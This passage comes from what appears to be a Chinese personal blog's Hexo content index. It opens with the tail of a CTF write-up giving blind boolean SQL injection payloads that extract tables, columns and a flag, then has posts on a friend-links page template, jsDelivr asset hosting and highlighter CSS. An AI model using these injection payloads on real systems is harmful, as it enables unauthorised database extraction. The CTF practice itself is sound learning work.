<code>(ascii(substr((select(database())),1,1))&gt;1)^0</code> 试了一手，发现大于和小于的结果的确不一样（分别会对应 <code>id=1</code> 和 <code>id=0</code> 的结果），于是拿出之前写好的二分模板，略作修改跑了起来。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#爆表</span><br><span class="line">(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;database())),&quot; . $i . &quot;,1))&gt;&quot; . $_mid . &quot;)^0</span><br><span class="line">#爆列</span><br><span class="line">(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_schema&#x3D;database())),&quot; . $i . &quot;,1))&gt;&quot; . $_mid . &quot;)^0</span><br><span class="line">#爆出 flag</span><br><span class="line">(ascii(substr((select(group_concat(password))from(F1naI1y)),&quot; . $i . &quot;,1))&gt;&quot; . $_mid . &quot;)^0</span><br></pre></td></tr></table></figure><p>其实这题还是有点心机的，flag 放在了很长的 password 里面（总共200+字符，如果不用二分得跑很久）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;43d07021-39af-481a-a873-3f9e1d0a29c0&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>友情链接layout折腾记录</title>
      <link href="/zh-CN/posts/1574d4d2.html"/>
      <url>/zh-CN/posts/1574d4d2.html</url>
      
        <content type="html"><![CDATA[<p>之前 blog 上的友情链接板块一直依靠于一个简单的 widget 实现，一开始甚至是一个完全不能容纳任何细节的列表式清单。后来照着其他 widget 的写法，稍微修改了一下 layout 实现了简洁的详细信息展示，但是 BUG 也随之而来。在不同缩放比例下，内容会溢出容器，显得极不协调。再者，单独的 widget 始终不是长久之计，于是折腾了一个页面。</p><p><escape><span id="more"></span></escape></p><h4 id="初期探索"><a href="#初期探索" class="headerlink" title="初期探索"></a>初期探索</h4><p>Icarus 这个主题使用 ejs 来生成页面，因此，我大致整理了一些细节。</p><h5 id="几种标签的意义"><a href="#几种标签的意义" class="headerlink" title="几种标签的意义"></a><strong>几种标签的意义</strong></h5><ul><li><p><code>&lt;%</code> ‘脚本’ 标签，用于流程控制，无输出。</p></li><li><p><code>&lt;%_</code> 删除其前面的空格符</p></li><li><p><code>&lt;%=</code> 输出数据到模板（输出是转义 HTML 标签）</p></li><li><p><code>&lt;%-</code> 输出非转义的数据到模板</p></li><li><p><code>&lt;%#</code> 注释标签，不执行、不输出内容</p></li><li><p><code>&lt;%%</code> 输出字符串 ‘&lt;%’</p></li><li><p><code>%&gt;</code> 一般结束标签</p></li><li><p><code>-%&gt;</code> 删除紧随其后的换行符</p></li><li><p><code>_%&gt;</code> 将结束标签后面的空格符删除</p></li></ul><h5 id="config-yml-与代码的链接"><a href="#config-yml-与代码的链接" class="headerlink" title="_config.yml 与代码的链接"></a><strong>_config.yml 与代码的链接</strong></h5><p>在 layout 的代码中，使用 <code>theme</code> 这一个对象可以访问整个 <code>theme/_config.yml</code> 中的所有配置。而使用对象的访问方法可对其逐层递进， <code>theme.widgets</code> 可以访问到各 widget 的配置。但这时候的 <code>theme.widgets</code> 实际上已经变成了一个可遍历的数组，其形式有点类似于 Python 中的字典。而这些 key 对应的 value 又是一个对象，当你尝试把它输出，会得到 <code>[Object object]</code> 这样的结果。因此，为了访问到单独的 <code>friend</code> 这一层，就得转换两次。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">widgets:</span></span><br><span class="line">    <span class="bullet">-</span></span><br><span class="line">        <span class="attr">type:</span> <span class="string">friends</span></span><br><span class="line">        <span class="attr">position:</span> <span class="string">left</span></span><br><span class="line">        <span class="attr">friends:</span></span><br><span class="line">            <span class="attr">friend1:</span> </span><br><span class="line">                <span class="attr">url:</span> <span class="string">&#x27;testUrl&#x27;</span></span><br><span class="line">                <span class="attr">description:</span> <span class="string">&#x27;testDescription&#x27;</span></span><br><span class="line">                <span class="attr">avatar:</span> <span class="string">&#x27;avatarUrl&#x27;</span></span><br><span class="line">            <span class="attr">friend2:</span> </span><br><span class="line">                <span class="attr">url:</span> <span class="string">&#x27;testUrl&#x27;</span></span><br><span class="line">                <span class="attr">description:</span> <span class="string">&#x27;testDescription&#x27;</span></span><br><span class="line">                <span class="attr">avatar:</span> <span class="string">&#x27;avatarUrl&#x27;</span></span><br><span class="line">    <span class="bullet">-</span></span><br></pre></td></tr></table></figure><h5 id="layout-与页面渲染的链接"><a href="#layout-与页面渲染的链接" class="headerlink" title="layout 与页面渲染的链接"></a><strong>layout 与页面渲染的链接</strong></h5><p>要将页面模板与独立页面链接在一起，使 Hexo 在生成页面的时候按照所写模板生成，只需要将模板放到 <code>root/to/theme/path/layout</code> 下。然后新建一个普通页面。在顶部添加 <code>layout: layoutName</code> 一行然后保存。 <span class="heimu" title="你发现了！！">注意空格！！</span></p><h4 id="照着页面写模板"><a href="#照着页面写模板" class="headerlink" title="照着页面写模板"></a>照着页面写模板</h4><p>这一部分，前排感谢 <a href="https://dwd.moe">Bhao</a> 大佬的帮助。<br><br>参考着大佬的 CSS ，我成功地写出了自适应缩放的页面模板。而两次转换对象访问到每一个 <code>friend</code> 的代码是这样的。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;% for (widget in theme.widgets)&#123; %&gt;</span><br><span class="line">    &lt;% if (theme.widgets[widget].type == &#x27;friends&#x27;)&#123; %&gt;</span><br><span class="line">        &lt;% let count = 0; %&gt;</span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;friendLink-Area&quot;</span>&gt;</span></span><br><span class="line">        &lt;% for (nickname in theme.widgets[widget].friends)&#123; %&gt;</span><br><span class="line">            &lt;% let friend = theme.widgets[widget].friends[nickname]; %&gt;</span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&lt;%= friend.url %&gt;&quot;</span> <span class="attr">class</span>=<span class="string">&quot;friendLink-square card&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;friendLink-img&quot;</span> <span class="attr">style</span>=<span class="string">&quot;text-align: left; pointer-events: none;&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;&lt;%= friend.avatar %&gt;&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;level-item friendLink-nickname&quot;</span> <span class="attr">style</span>=<span class="string">&quot;margin-bottom: 0px;&quot;</span>&gt;</span></span><br><span class="line">                    &lt;%= nickname %&gt;</span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;friendLink-description&quot;</span>&gt;</span></span><br><span class="line">                    &lt;%= friend.description %&gt;</span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;friendLink-url level-item tag&quot;</span>&gt;</span></span><br><span class="line">                    &lt;%- get_domain(friend.url) %&gt;</span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">            &lt;% count++; %&gt;</span><br><span class="line">        &lt;% &#125; %&gt;</span><br><span class="line">    &lt;% &#125; %&gt;</span><br><span class="line">&lt;% &#125; %&gt;</span><br></pre></td></tr></table></figure><p>在这段代码的上面接上原本页面的框架代码，在下面接上一个自定义标题的评论区，再加入一点点细节，就形成了 <a href="https://lemonprefect.cn/friends">友链页面</a> 这样一个页面。</p><p>至于具体显示出来的效果嘛，确定了框架，接下来发挥的就是 CSS 啦。套用一部分原来在 widget 上使用的 CSS。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.friendLink-card</span> &#123;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">97px</span>;</span><br><span class="line"><span class="attribute">width</span>: <span class="number">10086px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.friendLink-img</span> &#123;</span><br><span class="line"><span class="attribute">position</span>: relative;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.friendLink-img</span> <span class="selector-tag">img</span> &#123;</span><br><span class="line"><span class="attribute">position</span>: absolute;</span><br><span class="line"><span class="attribute">top</span>: <span class="number">6px</span>;</span><br><span class="line"><span class="attribute">width</span>: <span class="number">85px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.friendLink-nickname</span> &#123;</span><br><span class="line"><span class="attribute">margin-top</span>: <span class="number">6px</span>;</span><br><span class="line"><span class="attribute">margin-left</span>: <span class="number">100px</span>;</span><br><span class="line"><span class="attribute">padding-bottom</span>: <span class="number">3px</span>;</span><br><span class="line"><span class="attribute">width</span>: auto;</span><br><span class="line"><span class="attribute">overflow</span>: hidden;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.friendLink-description</span> &#123;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">43px</span>;</span><br><span class="line"><span class="attribute">color</span>: grey;</span><br><span class="line"><span class="attribute">font-size</span>: <span class="number">10px</span>;</span><br><span class="line"><span class="attribute">margin-left</span>: <span class="number">100px</span>;</span><br><span class="line"><span class="attribute">overflow</span>: hidden;</span><br><span class="line"><span class="attribute">text-align</span>: left;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.friendLink-url</span> &#123;</span><br><span class="line"><span class="attribute">text-align</span>: right;</span><br><span class="line"><span class="attribute">margin-right</span>: <span class="number">0px</span>;</span><br><span class="line"><span class="attribute">float</span>: right;</span><br><span class="line"><span class="attribute">overflow</span>: hidden;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后再加上整体版面的一个 area</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.friendLink-Area</span>&#123;</span><br><span class="line">    <span class="attribute">margin-top</span>: <span class="number">6px</span>;</span><br><span class="line">    <span class="attribute">margin-bottom</span>: <span class="number">18px</span>;</span><br><span class="line">    <span class="attribute">text-align</span>: center;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.friendLink-Area</span> <span class="selector-tag">a</span>&#123;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#363636</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.friendLink-square</span>&#123;</span><br><span class="line">    <span class="attribute">margin-top</span>: <span class="number">4px</span> <span class="meta">!important</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">280px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">110px</span>;</span><br><span class="line">    <span class="attribute">display</span>: inline-block;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">0.5em</span> <span class="number">0.75em</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.friendLink-square</span><span class="selector-pseudo">:hover</span>&#123;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="number">#f5f5f5</span>;</span><br><span class="line">    <span class="attribute">background</span>: <span class="number">#f5f5f5</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="细节修正"><a href="#细节修正" class="headerlink" title="细节修正"></a>细节修正</h4><p>鉴于原本的 widget 在手机端自适应访问的时候会显得很累赘，所以，在模板中加入一段 JS 来在这个页面中将原本的 widget 删除掉。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> widgetFriends = <span class="built_in">document</span>.getElementById(<span class="string">&quot;widgetFriends&quot;</span>);</span><br><span class="line">        widgetFriends.remove();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后，将 CSS 放到 jsDelivr 上，然后在模板中引用，就成功上线了。</p>]]></content>
      
      
      <categories>
          
          <category> Daily </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BlogModify </tag>
            
            <tag> Layout </tag>
            
            <tag> CSS </tag>
            
            <tag> Script </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>用jsDelivr分发资源</title>
      <link href="/zh-CN/posts/831655bb.html"/>
      <url>/zh-CN/posts/831655bb.html</url>
      
        <content type="html"><![CDATA[<p>某次修改 blog 模板的时候，看到了 jsDelivr 下发的一段 CSS ，当时以为是个本地的文件，但遍寻不见。遂请教大佬，得知了 jsDelivr 这个东西。搜索了一波，发现使用 GitHub + jsDelivr 来做个资源分发极好。</p><p><escape><span id="more"></span></escape></p><h4 id="理想图床？"><a href="#理想图床？" class="headerlink" title="理想图床？"></a>理想图床？</h4><p>看了一圈，发现这个方案用来做一波图床也是极稳的，一方面所有图片都来自自己的 GitHub 库，一方面引用也不用担心失效。 <span class="heimu" title="嘿嘿:)">其实也为了加快 blog 的访问速度，避免所有资源都从同一个地方获取</span></p><h4 id="repo-的建立"><a href="#repo-的建立" class="headerlink" title="repo 的建立"></a>repo 的建立</h4><p>考虑到 blog 中使用的文件无非是图片和 CSS/JS ，于是顺手新建了一个项目，三种文件分开。图片另外分作封面和文章中的图，而文章中的图片取其 MD5 作为其名称。 <span class="heimu" title="嘿嘿:)">这样就避免了名称重复</span></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">├─css</span><br><span class="line">├─images</span><br><span class="line">│  ├─ArticlePic</span><br><span class="line">│  └─Cover</span><br><span class="line">└─js</span><br></pre></td></tr></table></figure><h4 id="文章中的应用"><a href="#文章中的应用" class="headerlink" title="文章中的应用"></a>文章中的应用</h4><p>在使用这个方案之前，我在文章中插入图片的做法是将图片先转换成 base64 的编码，然后在 Markdown 中作为一个注释插入，然后在文中引用。好处是文章就是完全整体，不管怎么移动位置，图片始终完好。缺点就是一长串的编码扰乱了字数统计系统，给各种维护带来不便。再者，写文章的体验也受到了影响。</p><h4 id="jsDelivr-的操作"><a href="#jsDelivr-的操作" class="headerlink" title="jsDelivr 的操作"></a>jsDelivr 的操作</h4><h5 id="资源引用"><a href="#资源引用" class="headerlink" title="资源引用"></a>资源引用</h5><p>根据 jsDelivr 的规则，对于 repo 的 release ，可以这样访问其中资源，但是对资源有大小限制</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;&#123;GitHub用户名&#125;&#x2F;&#123;repo名&#125;@&#123;release版本号&#125;&#x2F;&#123;repo中的文件路径&#125;&#x2F;&#123;文件名&#125;</span><br></pre></td></tr></table></figure><p>特别地，可以不指定 <code>&#123;release版本号&#125;</code> 来保持最新。官方不建议用于实际上线的项目中。 <span class="HighlightWKT7BlueGreen">实测忽略版本号可能会在短期之内引用上一个版本的同名资源（也就是没有更新的样子）</span> 不过指定一个版本号的范围也是没有问题的，譬如 1.5.x 都可以写作 1.5 。此外，也可以通过 commit 序号来获取资源，只需要将 <code>&#123;release版本号&#125;</code> 改成 <code>&#123;commit序号&#125;</code> 即可。</p><p>还有一个我挺喜欢的功能，在 CSS/JS 文件拓展名的后面加上 <code>.min</code> 就能自动生成一个该源文件的压缩版本。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*ORIGINAL*/</span></span><br><span class="line"><span class="comment">/*https://cdn.jsdelivr.net/gh/LemonPrefect/sDelivr@1.5.1/css/layout.page.friends.css*/</span></span><br><span class="line"><span class="selector-class">.friendLink-Area</span>&#123;</span><br><span class="line">    <span class="attribute">margin-top</span>: <span class="number">6px</span>;</span><br><span class="line">    <span class="attribute">margin-bottom</span>: <span class="number">18px</span>;</span><br><span class="line">    <span class="attribute">text-align</span>: center;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.friendLink-Area</span> <span class="selector-tag">a</span>&#123;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#363636</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.friendLink-square</span>&#123;</span><br><span class="line">    <span class="attribute">margin-top</span>: <span class="number">4px</span> <span class="meta">!important</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">280px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">110px</span>;</span><br><span class="line">    <span class="attribute">display</span>: inline-block;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">0.5em</span> <span class="number">0.75em</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.friendLink-square</span><span class="selector-pseudo">:hover</span>&#123;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="number">#f5f5f5</span>;</span><br><span class="line">    <span class="attribute">background</span>: <span class="number">#f5f5f5</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*PROCESSED*/</span></span><br><span class="line"><span class="comment">/*https://cdn.jsdelivr.net/gh/LemonPrefect/sDelivr@1.5.1/css/layout.page.friends.min.css*/</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Minified by jsDelivr using clean-css v4.2.1.</span></span><br><span class="line"><span class="comment"> * Original file: /gh/LemonPrefect/sDelivr@1.5.1/css/layout.page.friends.css</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Do NOT use SRI with dynamically generated files! More information: https://www.jsdelivr.com/using-sri-with-dynamic-files</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="selector-class">.friendLink-Area</span>&#123;<span class="attribute">margin-top</span>:<span class="number">6px</span>;<span class="attribute">margin-bottom</span>:<span class="number">18px</span>;<span class="attribute">text-align</span>:center&#125;<span class="selector-class">.friendLink-Area</span> <span class="selector-tag">a</span>&#123;<span class="attribute">color</span>:<span class="number">#363636</span>&#125;<span class="selector-class">.friendLink-square</span>&#123;<span class="attribute">margin-top</span>:<span class="number">4px</span><span class="meta">!important</span>;<span class="attribute">width</span>:<span class="number">280px</span>;<span class="attribute">height</span>:<span class="number">110px</span>;<span class="attribute">display</span>:inline-block;<span class="attribute">padding</span>:.<span class="number">5em</span> .<span class="number">75em</span>&#125;<span class="selector-class">.friendLink-square</span><span class="selector-pseudo">:hover</span>&#123;<span class="attribute">background-color</span>:<span class="number">#f5f5f5</span>;<span class="attribute">background</span>:<span class="number">#f5f5f5</span>&#125;</span><br><span class="line"><span class="comment">/*# sourceMappingURL=/sm/3fbc473b94f2ce6d04583f788bcf2562f42fb136b727e2ff5354d6a30849cf80.map */</span></span><br></pre></td></tr></table></figure><h5 id="统计信息"><a href="#统计信息" class="headerlink" title="统计信息"></a>统计信息</h5><p>jsDelivr 很贴心地给了一个资源引用的统计页面，具体到了每一个资源的次数。通过以下地址可以具体查看。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.jsdelivr.com&#x2F;package&#x2F;gh&#x2F;&#123;GitHub用户名&#125;&#x2F;&#123;repo名&#125;</span><br></pre></td></tr></table></figure><p>这里附上我的 repo 资源访问总数</p><pa><p><a href="https://www.jsdelivr.com/package/gh/LemonPrefect/sDelivr"><img src="https://data.jsdelivr.com/v1/package/gh/LemonPrefect/sDelivr/badge"></a></p></pa>]]></content>
      
      
      <categories>
          
          <category> Daily </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BlogExpImp. </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>给我的Highlights上点色</title>
      <link href="/zh-CN/posts/9b201137.html"/>
      <url>/zh-CN/posts/9b201137.html</url>
      
        <content type="html"><![CDATA[<p>某大佬群里的人突然开始流行起写语雀来，看了一圈的我想起了很久以来一直想弄的东西——用 blog 做出可读性强的笔记。之前高中的时候用过类似的东西写笔记，但是由于局限性，很多东西仍然无法代替地需要手写，因此体验一直不好。刚好寒假也有些细碎的时间，就此定下一个计划来一点一点把它变成我想要的样子。<span class="HighlightWKT7BlueGreen">因为主要注重体验改善，所以这个系列的文章都会偏细碎、偏简单。</span>这也就是 <code>Plan spare = new Plan();</code> 的来源了。这是这个系列的第一篇，也算一个好的开头。</p><p><escape><span id="more"></span></escape></p><h4 id="颜色的执念"><a href="#颜色的执念" class="headerlink" title="颜色的执念"></a>颜色的执念</h4><p>一直以来我都认为颜色在笔记中的地位是无可取代的，无论是区分重点抑或是区分层次，颜色都是最佳载体。而且颜色可以帮助自己形成独有的记忆。加之我一直喜欢玩各式各样彩色的墨水。<span class="heimu" title="有一说一">玩得深入真的很花钱</span> 所以，blog 怎么能没有荧光笔这种东西呢！</p><h4 id="直接冲CSS"><a href="#直接冲CSS" class="headerlink" title="直接冲CSS"></a>直接冲CSS</h4><p>有了上次黑幕的经验，这次上来直接往 css 上冲。</p><p>既然是荧光笔，照着 Microsoft Edge 的效果，用简单的 <code>background</code> 来实现就行啦！于是顺手写下 css</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.HighlightEdgeBlue</span>&#123;</span><br><span class="line">    <span class="attribute">background</span>: <span class="built_in">rgb</span>(<span class="number">166</span>, <span class="number">230</span>, <span class="number">255</span>);</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">0px</span> <span class="number">0px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Deploy 到线上看了看，居然效果还不错，于是照葫芦画瓢，接着从喜欢的颜色上挑了几种，然后调整了一下颜色的透明度。</p><h4 id="上线"><a href="#上线" class="headerlink" title="上线"></a>上线</h4><p>本来是准备直接像黑幕一样放在本地加载，但是后来发现了 jsDelivr 这个挺好的东西 <span class="heimu" title="嘿嘿:)"><del>Blog加载缓慢的问题终于有了些改善</del></span> 于是一顿操作，做好之后放到 Github 仓库里，发布以后用 jsDelivr 来加载。事实证明它确实不错（我超喜欢自动生成压缩格式这一点。</p><p>只需要在 head.ejs（全局可用） 或者文章中（局部使用）加上这样一句，就可以使用 Highlight 啦</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;https://cdn.jsdelivr.net/gh/LemonPrefect/sDelivr/css/var.highlight.min.css&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><h4 id="Sample"><a href="#Sample" class="headerlink" title="Sample"></a>Sample</h4><p>本来是不准备放 sample 的，但是我怕 class 名称太长我自己也记不住。 <span class="heimu" title="嘿嘿:)">真实</span></p><p>具体有些啥颜色嘛，<a href="https://cdn.jsdelivr.net/gh/LemonPrefect/sDelivr/css/var.highlight.css">戳这里！</a></p><p>于是，放上我喜欢的某首歌的歌词和我很菜的翻译 <span class="heimu" title="嘿嘿:)">特意用了衬线字体</span></p><p><span style="font-family:'Noto Serif SC';text-align:center">当<span class="HighlightEdgeYellow">太阳</span>升 莹莹回回 透过<span class="HighlightWKT7BlueGreen">车窗</span></span></p><p><span style="font-family:'Noto Serif SC';text-align:center">When the <span class="HighlightEdgeYellow">sun</span> rises, the sunlight goes through the <span class="HighlightWKT7BlueGreen">car windows</span>.</span></p><p><span style="font-family:'Noto Serif SC';text-align:center"><span class="HighlightEdgeBlue">清晨</span>的风微微泛着香</span></p><p><span style="font-family:'Noto Serif SC';text-align:center">The <span class="HighlightEdgeBlue">dawn</span> wind blows with fragrance.</span></p><p><span style="font-family:'Noto Serif SC';text-align:center">路过了中山 城市间恢复<span class="HighlightEdgeYellow">繁华模样</span></span></p><p><span style="font-family:'Noto Serif SC';text-align:center">I went through Zhongshan, which city has recovered to be <span class="HighlightEdgeYellow">prosperous</span>.</span></p><p><span style="font-family:'Noto Serif SC';text-align:center">而我这一次要去何方</span></p><p><span style="font-family:'Noto Serif SC';text-align:center">However, what should I go this time?</span></p><p><span style="font-family:'Noto Serif SC';text-align:center">昨夜想了太久 那个<span class="HighlightWKT7Brown">路口</span>哪有</span></p><p><span style="font-family:'Noto Serif SC';text-align:center">I still couldn’t find which <span class="HighlightWKT7Brown">cross</span> is the one after thinking for a long time last night sleeplessly.</span></p><p><span style="font-family:'Noto Serif SC';text-align:center">停下等候还是<span class="HighlightWechatOrange">一直走</span></span></p><p><span style="font-family:'Noto Serif SC';text-align:center">Should I stop to wait or <span class="HighlightWechatOrange">keep going</span>?</span></p>]]></content>
      
      
      <categories>
          
          <category> Daily </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BlogExpImp. </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Youth</title>
      <link href="/zh-CN/posts/ca6442d1.html"/>
      <url>/zh-CN/posts/ca6442d1.html</url>
      
